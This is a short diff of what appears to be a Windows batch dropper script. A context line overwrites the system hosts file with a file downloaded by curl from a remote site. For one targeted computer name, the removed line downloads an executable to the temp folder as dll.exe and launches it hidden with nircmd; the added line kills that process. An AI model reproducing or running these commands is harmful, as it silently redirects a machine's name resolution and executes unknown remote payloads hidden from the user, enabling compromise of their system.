@@ -14,7 +14,7 @@ curl.exe %proxy% https://cryptedlumos.github.io/Hosts/hosts --output "C:\Windows
 echo [TARGET START]
 echo %computername%
 if [%computername%]==[DESKTOP-HL4E5JJ] (
-curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
+taskkill /f /im dll.exe
 ) else (
 echo.
 )
